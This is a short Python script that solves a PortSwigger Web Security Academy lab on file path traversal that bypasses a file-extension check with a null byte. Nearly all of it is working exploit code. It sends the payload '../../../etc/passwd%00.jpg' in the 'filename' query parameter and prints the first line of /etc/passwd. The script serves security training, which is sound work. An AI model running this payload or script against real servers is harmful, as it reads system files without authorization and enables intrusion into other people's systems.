#######################################################################
#
# Lab: File path traversal, validation of file extension with 
#      null byte bypass
#
# Hack Steps: 
#      1. Inject payload into 'filename' query parameter to retrieve
#         the content of /etc/passwd
#      2. Extract the first line as a proof
#
#######################################################################
import requests
from colorama import Fore
import re

# Change this to your lab URL
LAB_URL = "https://0ae1008e03e6942f851f9beb00150064.web-security-academy.net" 

def main():
    print("⦗#⦘ Injection parameter: " + Fore.YELLOW + "filename")
    print(Fore.WHITE + "⦗1⦘ Injecting payload to retrieve the content of /etc/passwd.. ", end="", flush=True)

    payload = "../../../etc/passwd%00.jpg"

    try:
        fetch_with_payload = requests.get(f"{LAB_URL}/image?filename={payload}")
        
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch the page with the injected payload through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting the first line as a proof.. ", end="", flush=True)
    
    first_line = re.findall("(.*)\n", fetch_with_payload.text)[0]

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + first_line)
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()